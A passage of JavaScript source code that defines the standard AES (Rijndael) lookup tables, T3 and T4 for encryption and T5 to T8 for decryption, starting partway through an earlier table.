0x90e07070, 0x427c3e3e, 0xc471b5b5, 0xaacc6666, 0xd8904848, 0x05060303, 0x01f7f6f6, 0x121c0e0e, 0xa3c26161, 0x5f6a3535, 0xf9ae5757, 0xd069b9b9, 0x91178686, 0x5899c1c1, 0x273a1d1d, 0xb9279e9e, 0x38d9e1e1, 0x13ebf8f8, 0xb32b9898, 0x33221111, 0xbbd26969, 0x70a9d9d9, 0x89078e8e, 0xa7339494, 0xb62d9b9b, 0x223c1e1e, 0x92158787, 0x20c9e9e9, 0x4987cece, 0xffaa5555, 0x78502828, 0x7aa5dfdf, 0x8f038c8c, 0xf859a1a1, 0x80098989, 0x171a0d0d, 0xda65bfbf, 0x31d7e6e6, 0xc6844242, 0xb8d06868, 0xc3824141, 0xb0299999, 0x775a2d2d, 0x111e0f0f, 0xcb7bb0b0, 0xfca85454, 0xd66dbbbb, 0x3a2c1616];
var T3 = [0x63a5c663, 0x7c84f87c, 0x7799ee77, 0x7b8df67b, 0xf20dfff2, 0x6bbdd66b, 0x6fb1de6f, 0xc55491c5, 0x30506030, 0x01030201, 0x67a9ce67, 0x2b7d562b, 0xfe19e7fe, 0xd762b5d7, 0xabe64dab, 0x769aec76, 0xca458fca, 0x829d1f82, 0xc94089c9, 0x7d87fa7d, 0xfa15effa, 0x59ebb259, 0x47c98e47, 0xf00bfbf0, 0xadec41ad, 0xd467b3d4, 0xa2fd5fa2, 0xafea45af, 0x9cbf239c, 0xa4f753a4, 0x7296e472, 0xc05b9bc0, 0xb7c275b7, 0xfd1ce1fd, 0x93ae3d93, 0x266a4c26, 0x365a6c36, 0x3f417e3f, 0xf702f5f7, 0xcc4f83cc, 0x345c6834, 0xa5f451a5, 0xe534d1e5, 0xf108f9f1, 0x7193e271, 0xd873abd8, 0x31536231, 0x153f2a15, 0x040c0804, 0xc75295c7, 0x23654623, 0xc35e9dc3, 0x18283018, 0x96a13796, 0x050f0a05, 0x9ab52f9a, 0x07090e07, 0x12362412, 0x809b1b80, 0xe23ddfe2, 0xeb26cdeb, 0x27694e27, 0xb2cd7fb2, 0x759fea75, 0x091b1209, 0x839e1d83, 0x2c74582c, 0x1a2e341a, 0x1b2d361b, 0x6eb2dc6e, 0x5aeeb45a, 0xa0fb5ba0, 0x52f6a452, 0x3b4d763b, 0xd661b7d6, 0xb3ce7db3, 0x297b5229, 0xe33edde3, 0x2f715e2f, 0x84971384, 0x53f5a653, 0xd168b9d1, 0x00000000, 0xed2cc1ed, 0x20604020, 0xfc1fe3fc, 0xb1c879b1, 0x5bedb65b, 0x6abed46a, 0xcb468dcb, 0xbed967be, 0x394b7239, 0x4ade944a, 0x4cd4984c, 0x58e8b058, 0xcf4a85cf, 0xd06bbbd0, 0xef2ac5ef, 0xaae54faa, 0xfb16edfb, 0x43c58643, 0x4dd79a4d, 0x33556633, 0x85941185, 0x45cf8a45, 0xf910e9f9, 0x02060402, 0x7f81fe7f, 0x50f0a050, 0x3c44783c, 0x9fba259f, 0xa8e34ba8, 0x51f3a251, 0xa3fe5da3, 0x40c08040, 0x8f8a058f, 0x92ad3f92, 0x9dbc219d, 0x38487038, 0xf504f1f5, 0xbcdf63bc, 0xb6c177b6, 0xda75afda, 0x21634221, 0x10302010, 0xff1ae5ff, 0xf30efdf3, 0xd26dbfd2, 0xcd4c81cd, 0x0c14180c, 0x13352613, 0xec2fc3ec, 0x5fe1be5f, 0x97a23597, 0x44cc8844, 0x17392e17, 0xc45793c4, 0xa7f255a7, 0x7e82fc7e, 0x3d477a3d, 0x64acc864, 0x5de7ba5d, 0x192b3219, 0x7395e673, 0x60a0c060, 0x81981981, 0x4fd19e4f, 0xdc7fa3dc, 0x22664422, 0x2a7e542a, 0x90ab3b90, 0x88830b88, 0x46ca8c46, 0xee29c7ee, 0xb8d36bb8, 0x143c2814, 0xde79a7de, 0x5ee2bc5e, 0x0b1d160b, 0xdb76addb, 0xe03bdbe0, 0x32566432, 0x3a4e743a, 0x0a1e140a, 0x49db9249, 0x060a0c06, 0x246c4824, 0x5ce4b85c, 0xc25d9fc2, 0xd36ebdd3, 0xacef43ac, 0x62a6c462, 0x91a83991, 0x95a43195, 0xe437d3e4, 0x798bf279, 0xe732d5e7, 0xc8438bc8, 0x37596e37, 0x6db7da6d, 0x8d8c018d, 0xd564b1d5, 0x4ed29c4e, 0xa9e049a9, 0x6cb4d86c, 0x56faac56, 0xf407f3f4, 0xea25cfea, 0x65afca65, 0x7a8ef47a, 0xaee947ae, 0x08181008, 0xbad56fba, 0x7888f078, 0x256f4a25, 0x2e725c2e, 0x1c24381c, 0xa6f157a6, 0xb4c773b4, 0xc65197c6, 0xe823cbe8, 0xdd7ca1dd, 0x749ce874, 0x1f213e1f, 0x4bdd964b, 0xbddc61bd, 0x8b860d8b, 0x8a850f8a, 0x7090e070, 0x3e427c3e, 0xb5c471b5, 0x66aacc66, 0x48d89048, 0x03050603, 0xf601f7f6, 0x0e121c0e, 0x61a3c261, 0x355f6a35, 0x57f9ae57, 0xb9d069b9, 0x86911786, 0xc15899c1, 0x1d273a1d, 0x9eb9279e, 0xe138d9e1, 0xf813ebf8, 0x98b32b98, 0x11332211, 0x69bbd269, 0xd970a9d9, 0x8e89078e, 0x94a73394, 0x9bb62d9b, 0x1e223c1e, 0x87921587, 0xe920c9e9, 0xce4987ce, 0x55ffaa55, 0x28785028, 0xdf7aa5df, 0x8c8f038c, 0xa1f859a1, 0x89800989, 0x0d171a0d, 0xbfda65bf, 0xe631d7e6, 0x42c68442, 0x68b8d068, 0x41c38241, 0x99b02999, 0x2d775a2d, 0x0f111e0f, 0xb0cb7bb0, 0x54fca854, 0xbbd66dbb, 0x163a2c16];
var T4 = [0x6363a5c6, 0x7c7c84f8, 0x777799ee, 0x7b7b8df6, 0xf2f20dff, 0x6b6bbdd6, 0x6f6fb1de, 0xc5c55491, 0x30305060, 0x01010302, 0x6767a9ce, 0x2b2b7d56, 0xfefe19e7, 0xd7d762b5, 0xababe64d, 0x76769aec, 0xcaca458f, 0x82829d1f, 0xc9c94089, 0x7d7d87fa, 0xfafa15ef, 0x5959ebb2, 0x4747c98e, 0xf0f00bfb, 0xadadec41, 0xd4d467b3, 0xa2a2fd5f, 0xafafea45, 0x9c9cbf23, 0xa4a4f753, 0x727296e4, 0xc0c05b9b, 0xb7b7c275, 0xfdfd1ce1, 0x9393ae3d, 0x26266a4c, 0x36365a6c, 0x3f3f417e, 0xf7f702f5, 0xcccc4f83, 0x34345c68, 0xa5a5f451, 0xe5e534d1, 0xf1f108f9, 0x717193e2, 0xd8d873ab, 0x31315362, 0x15153f2a, 0x04040c08, 0xc7c75295, 0x23236546, 0xc3c35e9d, 0x18182830, 0x9696a137, 0x05050f0a, 0x9a9ab52f, 0x0707090e, 0x12123624, 0x80809b1b, 0xe2e23ddf, 0xebeb26cd, 0x2727694e, 0xb2b2cd7f, 0x75759fea, 0x09091b12, 0x83839e1d, 0x2c2c7458, 0x1a1a2e34, 0x1b1b2d36, 0x6e6eb2dc, 0x5a5aeeb4, 0xa0a0fb5b, 0x5252f6a4, 0x3b3b4d76, 0xd6d661b7, 0xb3b3ce7d, 0x29297b52, 0xe3e33edd, 0x2f2f715e, 0x84849713, 0x5353f5a6, 0xd1d168b9, 0x00000000, 0xeded2cc1, 0x20206040, 0xfcfc1fe3, 0xb1b1c879, 0x5b5bedb6, 0x6a6abed4, 0xcbcb468d, 0xbebed967, 0x39394b72, 0x4a4ade94, 0x4c4cd498, 0x5858e8b0, 0xcfcf4a85, 0xd0d06bbb, 0xefef2ac5, 0xaaaae54f, 0xfbfb16ed, 0x4343c586, 0x4d4dd79a, 0x33335566, 0x85859411, 0x4545cf8a, 0xf9f910e9, 0x02020604, 0x7f7f81fe, 0x5050f0a0, 0x3c3c4478, 0x9f9fba25, 0xa8a8e34b, 0x5151f3a2, 0xa3a3fe5d, 0x4040c080, 0x8f8f8a05, 0x9292ad3f, 0x9d9dbc21, 0x38384870, 0xf5f504f1, 0xbcbcdf63, 0xb6b6c177, 0xdada75af, 0x21216342, 0x10103020, 0xffff1ae5, 0xf3f30efd, 0xd2d26dbf, 0xcdcd4c81, 0x0c0c1418, 0x13133526, 0xecec2fc3, 0x5f5fe1be, 0x9797a235, 0x4444cc88, 0x1717392e, 0xc4c45793, 0xa7a7f255, 0x7e7e82fc, 0x3d3d477a, 0x6464acc8, 0x5d5de7ba, 0x19192b32, 0x737395e6, 0x6060a0c0, 0x81819819, 0x4f4fd19e, 0xdcdc7fa3, 0x22226644, 0x2a2a7e54, 0x9090ab3b, 0x8888830b, 0x4646ca8c, 0xeeee29c7, 0xb8b8d36b, 0x14143c28, 0xdede79a7, 0x5e5ee2bc, 0x0b0b1d16, 0xdbdb76ad, 0xe0e03bdb, 0x32325664, 0x3a3a4e74, 0x0a0a1e14, 0x4949db92, 0x06060a0c, 0x24246c48, 0x5c5ce4b8, 0xc2c25d9f, 0xd3d36ebd, 0xacacef43, 0x6262a6c4, 0x9191a839, 0x9595a431, 0xe4e437d3, 0x79798bf2, 0xe7e732d5, 0xc8c8438b, 0x3737596e, 0x6d6db7da, 0x8d8d8c01, 0xd5d564b1, 0x4e4ed29c, 0xa9a9e049, 0x6c6cb4d8, 0x5656faac, 0xf4f407f3, 0xeaea25cf, 0x6565afca, 0x7a7a8ef4, 0xaeaee947, 0x08081810, 0xbabad56f, 0x787888f0, 0x25256f4a, 0x2e2e725c, 0x1c1c2438, 0xa6a6f157, 0xb4b4c773, 0xc6c65197, 0xe8e823cb, 0xdddd7ca1, 0x74749ce8, 0x1f1f213e, 0x4b4bdd96, 0xbdbddc61, 0x8b8b860d, 0x8a8a850f, 0x707090e0, 0x3e3e427c, 0xb5b5c471, 0x6666aacc, 0x4848d890, 0x03030506, 0xf6f601f7, 0x0e0e121c, 0x6161a3c2, 0x35355f6a, 0x5757f9ae, 0xb9b9d069, 0x86869117, 0xc1c15899, 0x1d1d273a, 0x9e9eb927, 0xe1e138d9, 0xf8f813eb, 0x9898b32b, 0x11113322, 0x6969bbd2, 0xd9d970a9, 0x8e8e8907, 0x9494a733, 0x9b9bb62d, 0x1e1e223c, 0x87879215, 0xe9e920c9, 0xcece4987, 0x5555ffaa, 0x28287850, 0xdfdf7aa5, 0x8c8c8f03, 0xa1a1f859, 0x89898009, 0x0d0d171a, 0xbfbfda65, 0xe6e631d7, 0x4242c684, 0x6868b8d0, 0x4141c382, 0x9999b029, 0x2d2d775a, 0x0f0f111e, 0xb0b0cb7b, 0x5454fca8, 0xbbbbd66d, 0x16163a2c];

// Transformations for decryption
var T5 = [0x51f4a750, 0x7e416553, 0x1a17a4c3, 0x3a275e96, 0x3bab6bcb, 0x1f9d45f1, 0xacfa58ab, 0x4be30393, 0x2030fa55, 0xad766df6, 0x88cc7691, 0xf5024c25, 0x4fe5d7fc, 0xc52acbd7, 0x26354480, 0xb562a38f, 0xdeb15a49, 0x25ba1b67, 0x45ea0e98, 0x5dfec0e1, 0xc32f7502, 0x814cf012, 0x8d4697a3, 0x6bd3f9c6, 0x038f5fe7, 0x15929c95, 0xbf6d7aeb, 0x955259da, 0xd4be832d, 0x587421d3, 0x49e06929, 0x8ec9c844, 0x75c2896a, 0xf48e7978, 0x99583e6b, 0x27b971dd, 0xbee14fb6, 0xf088ad17, 0xc920ac66, 0x7dce3ab4, 0x63df4a18, 0xe51a3182, 0x97513360, 0x62537f45, 0xb16477e0, 0xbb6bae84, 0xfe81a01c, 0xf9082b94, 0x70486858, 0x8f45fd19, 0x94de6c87, 0x527bf8b7, 0xab73d323, 0x724b02e2, 0xe31f8f57, 0x6655ab2a, 0xb2eb2807, 0x2fb5c203, 0x86c57b9a, 0xd33708a5, 0x302887f2, 0x23bfa5b2, 0x02036aba, 0xed16825c, 0x8acf1c2b, 0xa779b492, 0xf307f2f0, 0x4e69e2a1, 0x65daf4cd, 0x0605bed5, 0xd134621f, 0xc4a6fe8a, 0x342e539d, 0xa2f355a0, 0x058ae132, 0xa4f6eb75, 0x0b83ec39, 0x4060efaa, 0x5e719f06, 0xbd6e1051, 0x3e218af9, 0x96dd063d, 0xdd3e05ae, 0x4de6bd46, 0x91548db5, 0x71c45d05, 0x0406d46f, 0x605015ff, 0x1998fb24, 0xd6bde997, 0x894043cc, 0x67d99e77, 0xb0e842bd, 0x07898b88, 0xe7195b38, 0x79c8eedb, 0xa17c0a47, 0x7c420fe9, 0xf8841ec9, 0x00000000, 0x09808683, 0x322bed48, 0x1e1170ac, 0x6c5a724e, 0xfd0efffb, 0x0f853856, 0x3daed51e, 0x362d3927, 0x0a0fd964, 0x685ca621, 0x9b5b54d1, 0x24362e3a, 0x0c0a67b1, 0x9357e70f, 0xb4ee96d2, 0x1b9b919e, 0x80c0c54f, 0x61dc20a2, 0x5a774b69, 0x1c121a16, 0xe293ba0a, 0xc0a02ae5, 0x3c22e043, 0x121b171d, 0x0e090d0b, 0xf28bc7ad, 0x2db6a8b9, 0x141ea9c8, 0x57f11985, 0xaf75074c, 0xee99ddbb, 0xa37f60fd, 0xf701269f, 0x5c72f5bc, 0x44663bc5, 0x5bfb7e34, 0x8b432976, 0xcb23c6dc, 0xb6edfc68, 0xb8e4f163, 0xd731dcca, 0x42638510, 0x13972240, 0x84c61120, 0x854a247d, 0xd2bb3df8, 0xaef93211, 0xc729a16d, 0x1d9e2f4b, 0xdcb230f3, 0x0d8652ec, 0x77c1e3d0, 0x2bb3166c, 0xa970b999, 0x119448fa, 0x47e96422, 0xa8fc8cc4, 0xa0f03f1a, 0x567d2cd8, 0x223390ef, 0x87494ec7, 0xd938d1c1, 0x8ccaa2fe, 0x98d40b36, 0xa6f581cf, 0xa57ade28, 0xdab78e26, 0x3fadbfa4, 0x2c3a9de4, 0x5078920d, 0x6a5fcc9b, 0x547e4662, 0xf68d13c2, 0x90d8b8e8, 0x2e39f75e, 0x82c3aff5, 0x9f5d80be, 0x69d0937c, 0x6fd52da9, 0xcf2512b3, 0xc8ac993b, 0x10187da7, 0xe89c636e, 0xdb3bbb7b, 0xcd267809, 0x6e5918f4, 0xec9ab701, 0x834f9aa8, 0xe6956e65, 0xaaffe67e, 0x21bccf08, 0xef15e8e6, 0xbae79bd9, 0x4a6f36ce, 0xea9f09d4, 0x29b07cd6, 0x31a4b2af, 0x2a3f2331, 0xc6a59430, 0x35a266c0, 0x744ebc37, 0xfc82caa6, 0xe090d0b0, 0x33a7d815, 0xf104984a, 0x41ecdaf7, 0x7fcd500e, 0x1791f62f, 0x764dd68d, 0x43efb04d, 0xccaa4d54, 0xe49604df, 0x9ed1b5e3, 0x4c6a881b, 0xc12c1fb8, 0x4665517f, 0x9d5eea04, 0x018c355d, 0xfa877473, 0xfb0b412e, 0xb3671d5a, 0x92dbd252, 0xe9105633, 0x6dd64713, 0x9ad7618c, 0x37a10c7a, 0x59f8148e, 0xeb133c89, 0xcea927ee, 0xb761c935, 0xe11ce5ed, 0x7a47b13c, 0x9cd2df59, 0x55f2733f, 0x1814ce79, 0x73c737bf, 0x53f7cdea, 0x5ffdaa5b, 0xdf3d6f14, 0x7844db86, 0xcaaff381, 0xb968c43e, 0x3824342c, 0xc2a3405f, 0x161dc372, 0xbce2250c, 0x283c498b, 0xff0d9541, 0x39a80171, 0x080cb3de, 0xd8b4e49c, 0x6456c190, 0x7bcb8461, 0xd532b670, 0x486c5c74, 0xd0b85742];
var T6 = [0x5051f4a7, 0x537e4165, 0xc31a17a4, 0x963a275e, 0xcb3bab6b, 0xf11f9d45, 0xabacfa58, 0x934be303, 0x552030fa, 0xf6ad766d, 0x9188cc76, 0x25f5024c, 0xfc4fe5d7, 0xd7c52acb, 0x80263544, 0x8fb562a3, 0x49deb15a, 0x6725ba1b, 0x9845ea0e, 0xe15dfec0, 0x02c32f75, 0x12814cf0, 0xa38d4697, 0xc66bd3f9, 0xe7038f5f, 0x9515929c, 0xebbf6d7a, 0xda955259, 0x2dd4be83, 0xd3587421, 0x2949e069, 0x448ec9c8, 0x6a75c289, 0x78f48e79, 0x6b99583e, 0xdd27b971, 0xb6bee14f, 0x17f088ad, 0x66c920ac, 0xb47dce3a, 0x1863df4a, 0x82e51a31, 0x60975133, 0x4562537f, 0xe0b16477, 0x84bb6bae, 0x1cfe81a0, 0x94f9082b, 0x58704868, 0x198f45fd, 0x8794de6c, 0xb7527bf8, 0x23ab73d3, 0xe2724b02, 0x57e31f8f, 0x2a6655ab, 0x07b2eb28, 0x032fb5c2, 0x9a86c57b, 0xa5d33708, 0xf2302887, 0xb223bfa5, 0xba02036a, 0x5ced1682, 0x2b8acf1c, 0x92a779b4, 0xf0f307f2, 0xa14e69e2, 0xcd65daf4, 0xd50605be, 0x1fd13462, 0x8ac4a6fe, 0x9d342e53, 0xa0a2f355, 0x32058ae1, 0x75a4f6eb, 0x390b83ec, 0xaa4060ef, 0x065e719f, 0x51bd6e10, 0xf93e218a, 0x3d96dd06, 0xaedd3e05, 0x464de6bd, 0xb591548d, 0x0571c45d, 0x6f0406d4, 0xff605015, 0x241998fb, 0x97d6bde9, 0xcc894043, 0x7767d99e, 0xbdb0e842, 0x8807898b, 0x38e7195b, 0xdb79c8ee, 0x47a17c0a, 0xe97c420f, 0xc9f8841e, 0x00000000, 0x83098086, 0x48322bed, 0xac1e1170, 0x4e6c5a72, 0xfbfd0eff, 0x560f8538, 0x1e3daed5, 0x27362d39, 0x640a0fd9, 0x21685ca6, 0xd19b5b54, 0x3a24362e, 0xb10c0a67, 0x0f9357e7, 0xd2b4ee96, 0x9e1b9b91, 0x4f80c0c5, 0xa261dc20, 0x695a774b, 0x161c121a, 0x0ae293ba, 0xe5c0a02a, 0x433c22e0, 0x1d121b17, 0x0b0e090d, 0xadf28bc7, 0xb92db6a8, 0xc8141ea9, 0x8557f119, 0x4caf7507, 0xbbee99dd, 0xfda37f60, 0x9ff70126, 0xbc5c72f5, 0xc544663b, 0x345bfb7e, 0x768b4329, 0xdccb23c6, 0x68b6edfc, 0x63b8e4f1, 0xcad731dc, 0x10426385, 0x40139722, 0x2084c611, 0x7d854a24, 0xf8d2bb3d, 0x11aef932, 0x6dc729a1, 0x4b1d9e2f, 0xf3dcb230, 0xec0d8652, 0xd077c1e3, 0x6c2bb316, 0x99a970b9, 0xfa119448, 0x2247e964, 0xc4a8fc8c, 0x1aa0f03f, 0xd8567d2c, 0xef223390, 0xc787494e, 0xc1d938d1, 0xfe8ccaa2, 0x3698d40b, 0xcfa6f581, 0x28a57ade, 0x26dab78e, 0xa43fadbf, 0xe42c3a9d, 0x0d507892, 0x9b6a5fcc, 0x62547e46, 0xc2f68d13, 0xe890d8b8, 0x5e2e39f7, 0xf582c3af, 0xbe9f5d80, 0x7c69d093, 0xa96fd52d, 0xb3cf2512, 0x3bc8ac99, 0xa710187d, 0x6ee89c63, 0x7bdb3bbb, 0x09cd2678, 0xf46e5918, 0x01ec9ab7, 0xa8834f9a, 0x65e6956e, 0x7eaaffe6, 0x0821bccf, 0xe6ef15e8, 0xd9bae79b, 0xce4a6f36, 0xd4ea9f09, 0xd629b07c, 0xaf31a4b2, 0x312a3f23, 0x30c6a594, 0xc035a266, 0x37744ebc, 0xa6fc82ca, 0xb0e090d0, 0x1533a7d8, 0x4af10498, 0xf741ecda, 0x0e7fcd50, 0x2f1791f6, 0x8d764dd6, 0x4d43efb0, 0x54ccaa4d, 0xdfe49604, 0xe39ed1b5, 0x1b4c6a88, 0xb8c12c1f, 0x7f466551, 0x049d5eea, 0x5d018c35, 0x73fa8774, 0x2efb0b41, 0x5ab3671d, 0x5292dbd2, 0x33e91056, 0x136dd647, 0x8c9ad761, 0x7a37a10c, 0x8e59f814, 0x89eb133c, 0xeecea927, 0x35b761c9, 0xede11ce5, 0x3c7a47b1, 0x599cd2df, 0x3f55f273, 0x791814ce, 0xbf73c737, 0xea53f7cd, 0x5b5ffdaa, 0x14df3d6f, 0x867844db, 0x81caaff3, 0x3eb968c4, 0x2c382434, 0x5fc2a340, 0x72161dc3, 0x0cbce225, 0x8b283c49, 0x41ff0d95, 0x7139a801, 0xde080cb3, 0x9cd8b4e4, 0x906456c1, 0x617bcb84, 0x70d532b6, 0x74486c5c, 0x42d0b857];
var T7 = [0xa75051f4, 0x65537e41, 0xa4c31a17, 0x5e963a27, 0x6bcb3bab, 0x45f11f9d, 0x58abacfa, 0x03934be3, 0xfa552030, 0x6df6ad76, 0x769188cc, 0x4c25f502, 0xd7fc4fe5, 0xcbd7c52a, 0x44802635, 0xa38fb562, 0x5a49deb1, 0x1b6725ba, 0x0e9845ea, 0xc0e15dfe, 0x7502c32f, 0xf012814c, 0x97a38d46, 0xf9c66bd3, 0x5fe7038f, 0x9c951592, 0x7aebbf6d, 0x59da9552, 0x832dd4be, 0x21d35874, 0x692949e0, 0xc8448ec9, 0x896a75c2, 0x7978f48e, 0x3e6b9958, 0x71dd27b9, 0x4fb6bee1, 0xad17f088, 0xac66c920, 0x3ab47dce, 0x4a1863df, 0x3182e51a, 0x33609751, 0x7f456253, 0x77e0b164, 0xae84bb6b, 0xa01cfe81, 0x2b94f908, 0x68587048, 0xfd198f45, 0x6c8794de, 0xf8b7527b, 0xd323ab73, 0x02e2724b, 0x8f57e31f, 0xab2a6655, 0x2807b2eb, 0xc2032fb5, 0x7b9a86c5, 0x08a5d337, 0x87f23028, 0xa5b223bf, 0x6aba0203, 0x825ced16, 0x1c2b8acf, 0xb492a779, 0xf2f0f307, 0xe2a14e69, 0xf4cd65da, 0xbed50605, 0x621fd134, 0xfe8ac4a6, 0x539d342e, 0x55a0a2f3, 0xe132058a, 0xeb75a4f6, 0xec390b83, 0xefaa4060, 0x9f065e71, 0x1051bd6e, 0x8af93e21, 0x063d96dd, 0x05aedd3e, 0xbd464de6, 0x8db59154, 0x5d0571c4, 0xd46f0406, 0x15ff6050, 0xfb241998, 0xe997d6bd, 0x43cc8940, 0x9e7767d9, 0x42bdb0e8, 0x8b880789, 0x5b38e719, 0xeedb79c8, 0x0a47a17c, 0x0fe97c42, 0x1ec9f884, 0x00000000, 0x86830980, 0xed48322b, 0x70ac1e11, 0x724e6c5a, 0xfffbfd0e, 0x38560f85, 0xd51e3dae, 0x3927362d, 0xd9640a0f, 0xa621685c, 0x54d19b5b, 0x2e3a2436, 0x67b10c0a, 0xe70f9357, 0x96d2b4ee, 0x919e1b9b, 0xc54f80c0, 0x20a261dc, 0x4b695a77, 0x1a161c12, 0xba0ae293, 0x2ae5c0a0, 0xe0433c22, 0x171d121b, 0x0d0b0e09, 0xc7adf28b, 0xa8b92db6, 0xa9c8141e, 0x198557f1, 0x074caf75, 0xddbbee99, 0x60fda37f, 0x269ff701, 0xf5bc5c72, 0x3bc54466, 0x7e345bfb, 0x29768b43, 0xc6dccb23, 0xfc68b6ed, 0xf163b8e4, 0xdccad731, 0x85104263, 0x22401397, 0x112084c6, 0x247d854a, 0x3df8d2bb, 0x3211aef9, 0xa16dc729, 0x2f4b1d9e, 0x30f3dcb2, 0x52ec0d86, 0xe3d077c1, 0x166c2bb3, 0xb999a970, 0x48fa1194, 0x642247e9, 0x8cc4a8fc, 0x3f1aa0f0, 0x2cd8567d, 0x90ef2233, 0x4ec78749, 0xd1c1d938, 0xa2fe8cca, 0x0b3698d4, 0x81cfa6f5, 0xde28a57a, 0x8e26dab7, 0xbfa43fad, 0x9de42c3a, 0x920d5078, 0xcc9b6a5f, 0x4662547e, 0x13c2f68d, 0xb8e890d8, 0xf75e2e39, 0xaff582c3, 0x80be9f5d, 0x937c69d0, 0x2da96fd5, 0x12b3cf25, 0x993bc8ac, 0x7da71018, 0x636ee89c, 0xbb7bdb3b, 0x7809cd26, 0x18f46e59, 0xb701ec9a, 0x9aa8834f, 0x6e65e695, 0xe67eaaff, 0xcf0821bc, 0xe8e6ef15, 0x9bd9bae7, 0x36ce4a6f, 0x09d4ea9f, 0x7cd629b0, 0xb2af31a4, 0x23312a3f, 0x9430c6a5, 0x66c035a2, 0xbc37744e, 0xcaa6fc82, 0xd0b0e090, 0xd81533a7, 0x984af104, 0xdaf741ec, 0x500e7fcd, 0xf62f1791, 0xd68d764d, 0xb04d43ef, 0x4d54ccaa, 0x04dfe496, 0xb5e39ed1, 0x881b4c6a, 0x1fb8c12c, 0x517f4665, 0xea049d5e, 0x355d018c, 0x7473fa87, 0x412efb0b, 0x1d5ab367, 0xd25292db, 0x5633e910, 0x47136dd6, 0x618c9ad7, 0x0c7a37a1, 0x148e59f8, 0x3c89eb13, 0x27eecea9, 0xc935b761, 0xe5ede11c, 0xb13c7a47, 0xdf599cd2, 0x733f55f2, 0xce791814, 0x37bf73c7, 0xcdea53f7, 0xaa5b5ffd, 0x6f14df3d, 0xdb867844, 0xf381caaf, 0xc43eb968, 0x342c3824, 0x405fc2a3, 0xc372161d, 0x250cbce2, 0x498b283c, 0x9541ff0d, 0x017139a8, 0xb3de080c, 0xe49cd8b4, 0xc1906456, 0x84617bcb, 0xb670d532, 0x5c74486c, 0x5742d0b8];
var T8 = [0xf4a75051, 0x4165537e, 0x17a4c31a, 0x275e963a, 0xab6bcb3b, 0x9d45f11f, 0xfa58abac, 0xe303934b, 0x30fa5520, 0x766df6ad, 0xcc769188, 0x024c25f5, 0xe5d7fc4f, 0x2acbd7c5, 0x35448026, 0x62a38fb5, 0xb15a49de, 0xba1b6725, 0xea0e9845, 0xfec0e15d, 0x2f7502c3, 0x4cf01281, 0x4697a38d, 0xd3f9c66b, 0x8f5fe703, 0x929c9515, 0x6d7aebbf, 0x5259da95, 0xbe832dd4, 0x7421d358, 0xe0692949, 0xc9c8448e, 0xc2896a75, 0x8e7978f4, 0x583e6b99, 0xb971dd27, 0xe14fb6be, 0x88ad17f0, 0x20ac66c9, 0xce3ab47d, 0xdf4a1863, 0x1a3182e5, 0x51336097, 0x537f4562, 0x6477e0b1, 0x6bae84bb, 0x81a01cfe, 0x082b94f9, 0x48685870, 0x45fd198f, 0xde6c8794, 0x7bf8b752, 0x73d323ab, 0x4b02e272, 0x1f8f57e3, 0x55ab2a66, 0xeb2807b2, 0xb5c2032f, 0xc57b9a86, 0x3708a5d3, 0x2887f230, 0xbfa5b223, 0x036aba02, 0x16825ced, 0xcf1c2b8a, 0x79b492a7, 0x07f2f0f3, 0x69e2a14e, 0xdaf4cd65, 0x05bed506, 0x34621fd1, 0xa6fe8ac4, 0x2e539d34, 0xf355a0a2, 0x8ae13205, 0xf6eb75a4, 0x83ec390b, 0x60efaa40, 0x719f065e, 0x6e1051bd, 0x218af93e, 0xdd063d96, 0x3e05aedd, 0xe6bd464d, 0x548db591, 0xc45d0571, 0x06d46f04, 0x5015ff60, 0x98fb2419, 0xbde997d6, 0x4043cc89, 0xd99e7767, 0xe842bdb0, 0x898b8807, 0x195b38e7, 0xc8eedb79, 0x7c0a47a1, 0x420fe97c, 0x841ec9f8, 0x00000000, 0x80868309, 0x2bed4832, 0x1170ac1e, 0x5a724e6c, 0x0efffbfd, 0x8538560f, 0xaed51e3d, 0x2d392736, 0x0fd9640a, 0x5ca62168, 0x5b54d19b, 0x362e3a24, 0x0a67b10c, 0x57e70f93, 0xee96d2b4, 0x9b919e1b, 0xc0c54f80, 0xdc20a261, 0x774b695a, 0x121a161c, 0x93ba0ae2, 0xa02ae5c0, 0x22e0433c, 0x1b171d12, 0x090d0b0e, 0x8bc7adf2, 0xb6a8b92d, 0x1ea9c814, 0xf1198557, 0x75074caf, 0x99ddbbee, 0x7f60fda3, 0x01269ff7, 0x72f5bc5c, 0x663bc544, 0xfb7e345b, 0x4329768b, 0x23c6dccb, 0xedfc68b6, 0xe4f163b8, 0x31dccad7, 0x63851042, 0x97224013, 0xc6112084, 0x4a247d85, 0xbb3df8d2, 0xf93211ae, 0x29a16dc7, 0x9e2f4b1d, 0xb230f3dc, 0x8652ec0d, 0xc1e3d077, 0xb3166c2b, 0x70b999a9, 0x9448fa11, 0xe9642247, 0xfc8cc4a8, 0xf03f1aa0, 0x7d2cd856, 0x3390ef22, 0x494ec787, 0x38d1c1d9, 0xcaa2fe8c, 0xd40b3698, 0xf581cfa6, 0x7ade28a5, 0xb78e26da, 0xadbfa43f, 0x3a9de42c, 0x78920d50, 0x5fcc9b6a, 0x7e466254, 0x8d13c2f6, 0xd8b8e890, 0x39f75e2e, 0xc3aff582, 0x5d80be9f, 0xd0937c69, 0xd52da96f, 0x2512b3cf, 0xac993bc8, 0x187da710, 0x9c636ee8, 0x3bbb7bdb, 0x267809cd, 0x5918f46e, 0x9ab701ec, 0x4f9aa883, 0x956e65e6, 0xffe67eaa, 0xbccf0821, 0x15e8e6ef, 0xe79bd9ba, 0x6f36ce4a, 0x9f09d4ea, 0xb07cd629, 0xa4b2af31, 0x3f23312a, 0xa59430c6, 0xa266c035, 0x4ebc3774, 0x82caa6fc, 0x90d0b0e0, 0xa7d81533, 0x04984af1, 0xecdaf741, 0xcd500e7f, 0x91f62f17, 0x4dd68d76, 0xefb04d43, 0xaa4d54cc, 0x9604dfe4, 0xd1b5e39e, 0x6a881b4c, 0x2c1fb8c1, 0x65517f46, 0x5eea049d, 0x8c355d01, 0x877473fa, 0x0b412efb, 0x671d5ab3, 0xdbd25292, 0x105633e9, 0xd647136d, 0xd7618c9a, 0xa10c7a37, 0xf8148e59, 0x133c89eb, 0xa927eece, 0x61c935b7, 0x1ce5ede1, 0x47b13c7a, 0xd2df599c, 0xf2733f55, 0x14ce7918, 0xc737bf73, 0xf7cdea53, 0xfdaa5b5f, 0x3d6f14df, 0x44db8678, 0xaff381ca, 0x68c43eb9, 0x24342c38, 0xa3405fc2, 0x1dc37216, 0xe2250cbc, 0x3c498b28, 0x0d9541ff, 0xa8017139, 0x0cb3de08, 0xb4e49cd8, 0x56c19064, 0xcb84617b, 0x32b670d5, 0x6c5c7448, 0xb85742d0];

